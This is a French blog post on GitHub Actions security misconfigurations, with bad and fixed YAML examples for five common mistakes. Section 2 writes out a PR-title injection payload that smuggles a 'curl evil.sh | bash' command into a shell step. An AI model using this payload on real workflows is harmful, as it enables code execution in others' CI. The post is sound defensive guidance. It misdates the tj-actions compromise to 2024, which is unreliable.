---
title: "Les erreurs de sécurité GitHub Actions que les linters ne détectent pas"
description: "Les validateurs YAML repèrent la syntaxe, pas l'exposition. Voici les cinq mauvaises configurations GitHub Actions à fort impact — pull_request_target, injection de script, actions non épinglées, portées trop larges de GITHUB_TOKEN et curl|bash — avec le mauvais schéma et le correctif pour chacune."
pubDate: 2026-05-06
tags: ["github-actions", "security", "ci-cd"]
lang: fr
translationOf: "github-actions-security-misconfigurations"
---

![Bouclier avec un trou de serrure sur le titre sombre « Les erreurs de sécurité que les linters ne détectent pas » — mauvaises configurations de sécurité GitHub Actions à fort impact](/blog/github-actions-security-misconfigurations-hero.svg)

Un linter YAML vous indiquera quand votre workflow ne pourra pas être analysé. Il ne vous dira pas quand votre workflow confie un token en écriture à la pull request d'un fork, ou exécute comme code shell un nom de branche contrôlé par un attaquant. Ces bugs sont syntaxiquement parfaits — ils passent chaque vérification de schéma, s'exécutent au vert du premier coup, et élargissent discrètement votre surface d'attaque jusqu'à ce que quelqu'un s'en aperçoive.

GitHub Actions est particulièrement exposé parce que les workflows sont du code qui s'exécute à chaque push, souvent avec des secrets dans sa portée et un token capable d'écrire dans le dépôt. Les erreurs ci-dessous sont celles qui transforment un pipeline CI de routine en incident de chaîne d'approvisionnement. Aucune d'elles n'est détectée par la seule passe syntaxique d'`actionlint`, et toutes les cinq sont assez courantes pour apparaître chaque semaine dans de vrais dépôts publics.

## 1. `pull_request_target` qui récupère du code non fiable

Le déclencheur `pull_request_target` s'exécute avec **les secrets du dépôt de base et un token en lecture/écriture**, mais il récupère par défaut la branche *cible* — ce qui le rend utile pour étiqueter des PR ou publier des commentaires depuis des forks. Le piège consiste à récupérer le head de la PR puis à l'*exécuter*. Cela exécute du code contrôlé par un attaquant avec vos secrets dans la portée.

```yaml
# BAD — runs fork code with repo secrets and a write token
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }} # untrusted!
      - run: npm install && npm run build              # arbitrary code
```

Un attaquant ouvre une PR dont le `npm install` exécute un script `postinstall` malveillant, et ce script peut lire `secrets.*` ou exfiltrer le `GITHUB_TOKEN`. Si vous avez seulement besoin d'*inspecter* une PR, utilisez plutôt `pull_request` (pas de secrets, token en lecture seule). Si vous avez réellement besoin de secrets — par exemple pour publier un statut — séparez le travail : compilez le code non fiable dans un job `pull_request` sans secrets, puis agissez sur son résultat dans un workflow distinct et de confiance.

```yaml
# FIXED — untrusted code runs without secrets
on: pull_request          # forked PRs get a read-only token, no secrets
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4   # checks out PR head safely, unprivileged
      - run: npm ci && npm run build
```

Pourquoi c'est important : c'est le schéma Actions le plus exploité de tous. Traiter les PR de forks comme des entrées non fiables, c'est tout l'enjeu.

![Un workflow GitHub Actions annoté avec des erreurs de sécurité : pull_request_target, une action non épinglée, des permissions trop larges et une injection de script](/blog/github-actions-security-misconfigurations-diagram.svg)

## 2. Injection de script via `${{ github.event.* }}`

Tout ce qu'un utilisateur peut saisir — un titre de PR, un nom de branche, le corps d'une issue, un message de commit — est contrôlé par un attaquant. Lorsque vous l'interpolez directement dans un bloc `run:`, GitHub substitue la chaîne brute dans le shell *avant* que le shell ne s'exécute, de sorte qu'une valeur soigneusement conçue devient du code exécutable.

```yaml
# BAD — PR title is spliced straight into the shell
- name: Greet
  run: echo "Building PR: ${{ github.event.pull_request.title }}"
```

Une PR intitulée `"; curl evil.sh | bash #` transforme ce simple `echo` en deux commandes. Le correctif consiste à faire transiter la valeur non fiable par une variable d'environnement. Les variables définies dans `env:` ne sont pas interpolées par le runner — le shell les reçoit comme des données, et les protéger par des guillemets les maintient inertes.

```yaml
# FIXED — value arrives as data, never as code
- name: Greet
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Building PR: $PR_TITLE"
```

Pourquoi c'est important : c'est l'escalade de privilèges la plus facile en CI et elle ne nécessite aucun déclencheur particulier — tout workflow qui affiche du texte fourni par l'utilisateur est un candidat. L'indirection via `env:` coûte deux lignes et referme complètement la faille.

## 3. Actions tierces épinglées à un tag

`uses: some/action@v3` résout un tag mutable. Le propriétaire — ou quiconque compromet ce compte — peut faire pointer `v3` vers du nouveau code, et votre prochaine exécution le récupère sans que vous n'ayez rien changé. Les tags sont des alias de commodité, pas des garanties d'intégrité.

```yaml
# BAD — mutable reference, can change under you
- uses: tj-actions/changed-files@v44
```

Épinglez les actions tierces à un **SHA de commit complet de 40 caractères**. Un SHA est immuable : la seule façon de changer ce qui s'exécute est de le mettre à jour délibérément, ce qui est exactement le point de revue que vous souhaitez. Conservez la version lisible par un humain dans un commentaire en fin de ligne pour que les mises à jour restent intelligibles, et laissez Dependabot mettre à jour les épinglages pour vous.

```yaml
# FIXED — immutable, auditable pin
- uses: tj-actions/changed-files@a284dc1814e3fd07f2e34267fc8f81227ed29fb8 # v44.5.7
```

Pourquoi c'est important : la compromission de `tj-actions/changed-files` en mars 2024 — où un commit malveillant a été poussé derrière des tags existants et a divulgué les secrets de milliers de dépôts — n'a touché que les workflows épinglés à des tags. Les consommateurs épinglés par SHA sont restés intacts.

## 4. Permissions `GITHUB_TOKEN` trop larges

Si vous ne déclarez jamais `permissions:`, le `GITHUB_TOKEN` automatique peut par défaut accorder un accès large en lecture/écriture sur l'ensemble du dépôt, selon les paramètres de l'organisation et du dépôt. Cela signifie qu'une étape compromise — par exemple une dépendance malveillante — peut pousser des commits, modifier des releases ou ouvrir des pull requests en utilisant votre propre token.

```yaml
# BAD — no permissions block, token inherits broad defaults
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test
```

Définissez une **valeur par défaut en lecture seule en haut du workflow**, puis n'accordez les portées en écriture qu'aux jobs spécifiques qui en ont besoin. La plupart des jobs CI n'ont besoin de rien de plus que `contents: read`. Un job qui publie une release ou poste un commentaire reçoit exactement cette seule portée, et rien de plus.

```yaml
# FIXED — least privilege, scoped per job
on: push
permissions:
  contents: read            # workflow-wide default
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test
  release:
    needs: test
    runs-on: ubuntu-latest
    permissions:
      contents: write       # only this job can write
    steps:
      - uses: actions/checkout@v4
      - run: ./scripts/publish.sh
```

Pourquoi c'est important : le moindre privilège transforme « une étape compromise possède le dépôt » en « une étape compromise peut lire du code qu'elle pouvait déjà voir ». C'est la réduction de rayon d'impact la moins coûteuse que vous puissiez faire.

## 5. `curl | bash` à l'intérieur d'une étape

Faire passer un script distant directement dans un shell exécute tout ce que cette URL sert *au moment de l'exécution*, sans épinglage, sans somme de contrôle et sans revue. Si l'hôte est compromis, si le DNS est détourné, ou si le mainteneur pousse tout simplement une mauvaise version, cela s'exécute sur votre runner avec votre token dans la portée.

```yaml
# BAD — runs whatever the URL serves, unverified
- run: curl -sSL https://example.com/install.sh | bash
```

Épinglez l'installateur à une version connue et vérifiez sa somme de contrôle avant de l'exécuter — ou, mieux encore, utilisez une action de configuration vérifiée et épinglée par SHA qui fait déjà cela. L'objectif est de faire de « quel code s'est exécuté » un fait que vous pouvez reconstituer après coup.

```yaml
# FIXED — download, verify, then run
- run: |
    curl -fsSL -o install.sh https://example.com/v1.2.3/install.sh
    echo "9b74c9897bac770ffc029102a200c5de  install.sh" | md5sum -c -
    bash install.sh
```

Pourquoi c'est important : `curl | bash` est une dépendance non signée et non versionnée que vous récupérez à nouveau à chaque exécution. L'épinglage et la vérification transforment une confiance aveugle en une confiance auditable.

## Détectez-les avant la fusion

Chacune de ces erreurs passe une vérification de schéma YAML, et c'est pourquoi un linter syntaxique les ignore complètement. Ce sont des problèmes d'accessibilité et de confiance, pas des problèmes d'analyse — et c'est précisément ce que la revue est censée détecter, mais que l'on attrape rarement d'un simple coup d'œil.

Le **GitHub Actions Validator** vérifie les cinq, côté client, dès que vous collez un workflow : il signale les checkouts de `pull_request_target` sur des refs non fiables, l'interpolation de `${{ }}` dans les étapes `run:`, les actions tierces non épinglées, les `permissions:` manquantes ou trop larges, et les invocations `curl | bash` — aux côtés des erreurs YAML ordinaires. Rien n'est téléversé ; votre workflow ne quitte jamais le navigateur.

Si vous avez déjà livré un workflow en espérant qu'il était sûr, c'est l'étape qui vous en assure.

[Essayez le GitHub Actions Validator →](/github-actions-validator)
